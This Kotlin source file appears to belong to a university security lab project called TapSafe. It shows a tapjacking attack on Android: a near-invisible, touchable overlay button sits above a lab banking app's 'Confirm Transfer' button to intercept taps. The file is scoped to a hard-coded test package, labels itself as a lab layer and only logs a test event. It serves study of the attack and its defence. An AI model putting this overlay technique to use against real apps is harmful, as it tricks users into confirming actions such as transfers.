package my.edu.unikl.tapsafe.overlay

import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast

/**
 * TapSafe Overlay Lab.
 *
 * Demonstrates the actual tapjacking mechanism: a small, labelled, TOUCHABLE overlay button is
 * placed on top of the TapSafe Victim app's "Confirm Transfer" button, at roughly the same
 * screen position. If the victim app's button is unprotected, the user's tap lands on this
 * hidden overlay button instead of the real one underneath - which is exactly the attack
 * `SecureActionButton` / `filterTouchesWhenObscured` is built to defeat.
 *
 * Scope stays identical to the project's Rules of Engagement: this overlay only ever targets
 * `my.edu.unikl.tapsafe.victim` (hard-coded package, see RoE / README), is always visibly
 * labelled as a TapSafe lab layer, and performs no credential capture, no real transaction and
 * no data exfiltration - tapping the hidden button only records a local, non-sensitive event.
 */
class MainActivity : Activity() {
    private lateinit var windowManager: WindowManager
    private var bannerView: TextView? = null
    private var hiddenButtonView: Button? = null
    private var receiverRegistered = false

    private val stopReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            stopLab()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val filter = IntentFilter(ACTION_STOP_OVERLAY)
        if (Build.VERSION.SDK_INT >= 33) {
            registerReceiver(stopReceiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            @Suppress("DEPRECATION")
            registerReceiver(stopReceiver, filter)
        }
        receiverRegistered = true
        renderControls()
    }

    private fun renderControls() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(28, 32, 28, 32)
            setBackgroundColor(Color.rgb(247, 249, 252))
        }
        layout.addView(TextView(this).apply {
            text = "TAPSAFE OVERLAY LAB"
            textSize = 26f
            setTypeface(typeface, Typeface.BOLD)
            setTextColor(Color.BLACK)
        })
        layout.addView(TextView(this).apply {
            text = "This is a clearly labelled, user-started overlay that targets only the TapSafe " +
                "Victim lab app's \"Confirm Transfer\" button. No third-party or real app is targeted, " +
                "and the hidden button below performs no real action - it only logs a test event."
            textSize = 15f
            setTextColor(Color.DKGRAY)
            setPadding(0, 20, 0, 20)
        })
        layout.addView(button("1. Grant overlay permission") { requestOverlayPermission() })
        layout.addView(button("2. Start lab overlay over victim app") { startLab() })
        layout.addView(button("3. Stop overlay now") { stopLab() })
        layout.addView(button("Return to TapSafe victim app") {
            packageManager.getLaunchIntentForPackage("my.edu.unikl.tapsafe.victim")?.let(::startActivity)
        })

        layout.addView(TextView(this).apply {
            text = "Test note: on Android 12+, Android may block touch pass-through or reveal the " +
                "overlay through system protections. Recording this behaviour honestly (blocked vs " +
                "not blocked) is itself a valid, expected result for the report."
            textSize = 13f
            setTextColor(Color.rgb(120, 60, 20))
            setPadding(0, 24, 0, 0)
        })
        setContentView(layout)
    }

    private fun requestOverlayPermission() {
        if (!Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            startActivity(intent)
        } else {
            Toast.makeText(this, "Overlay permission already granted", Toast.LENGTH_SHORT).show()
        }
    }

    private fun startLab() {
        if (!Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Grant overlay permission first", Toast.LENGTH_LONG).show()
            requestOverlayPermission()
            return
        }
        if (bannerView != null) stopLab()

        // Layer 1: full-screen, non-touchable, clearly labelled banner. This never intercepts
        // taps; it exists purely so the overlay is visually obvious during testing/screenshots.
        val banner = TextView(this).apply {
            text = "TAPSAFE LAB OVERLAY - visible test layer, tap only inside the bank demo below"
            textSize = 15f
            gravity = Gravity.CENTER
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.rgb(25, 55, 110))
            setPadding(20, 20, 20, 20)
        }
        val bannerParams = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply { gravity = Gravity.TOP }

        // Layer 2: the actual hidden-button demo. TOUCHABLE, positioned over where the victim
        // app's "Confirm Transfer" button sits, and visually near-transparent so a test user
        // would not consciously notice it - this is the core tapjacking mechanism being studied.
        // Fixed offset - edit HIDDEN_BUTTON_OFFSET_DP below and rebuild if it needs to line up
        // differently with the victim app's "Confirm Transfer" button on your device/emulator.
        val offsetPx = (HIDDEN_BUTTON_OFFSET_DP * resources.displayMetrics.density).toInt()
        val hiddenButton = Button(this).apply {
            text = "" // no visible label - that is the point of the demo
            alpha = 0.02f // effectively invisible, but still a real, tappable view
            setBackgroundColor(Color.MAGENTA)
            setOnClickListener {
                Toast.makeText(this@MainActivity, "Hidden overlay button intercepted the tap", Toast.LENGTH_SHORT).show()
                sendBroadcast(
                    Intent(ACTION_HIDDEN_TAP).setPackage("my.edu.unikl.tapsafe.victim")
                )
            }
        }
        val hiddenParams = WindowManager.LayoutParams(
            620, 180,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.CENTER_HORIZONTAL
            y = offsetPx
        }

        try {
            windowManager.addView(banner, bannerParams)
            bannerView = banner
            windowManager.addView(hiddenButton, hiddenParams)
            hiddenButtonView = hiddenButton
            Toast.makeText(this, "Lab overlay started", Toast.LENGTH_SHORT).show()
            val victim = packageManager.getLaunchIntentForPackage("my.edu.unikl.tapsafe.victim")
            if (victim == null) {
                stopLab()
                Toast.makeText(this, "Install TapSafe Victim first", Toast.LENGTH_LONG).show()
            } else {
                startActivity(victim)
            }
        } catch (error: Exception) {
            bannerView = null
            hiddenButtonView = null
            Toast.makeText(this, "Overlay could not start: ${error.javaClass.simpleName}", Toast.LENGTH_LONG).show()
        }
    }

    private fun stopLab() {
        bannerView?.let { view ->
            try { windowManager.removeView(view) } catch (_: IllegalArgumentException) { }
        }
        hiddenButtonView?.let { view ->
            try { windowManager.removeView(view) } catch (_: IllegalArgumentException) { }
        }
        bannerView = null
        hiddenButtonView = null
        Toast.makeText(this, "TapSafe overlay stopped", Toast.LENGTH_SHORT).show()
    }

    private fun button(textValue: String, action: () -> Unit): Button =
        Button(this).apply {
            text = textValue
            isAllCaps = false
            setOnClickListener { action() }
        }

    override fun onDestroy() {
        stopLab()
        if (receiverRegistered) unregisterReceiver(stopReceiver)
        super.onDestroy()
    }

    companion object {
        const val ACTION_STOP_OVERLAY = "my.edu.unikl.tapsafe.overlay.STOP_OVERLAY"
        const val ACTION_HIDDEN_TAP = "my.edu.unikl.tapsafe.overlay.HIDDEN_TAP"

        /**
         * Vertical position (in dp from the top of the screen) of the hidden overlay button.
         * Edit this value and rebuild if it doesn't line up with the victim app's
         * "Confirm Transfer" button on your device/emulator's screen size.
         */
        private const val HIDDEN_BUTTON_OFFSET_DP = 640
    }
}
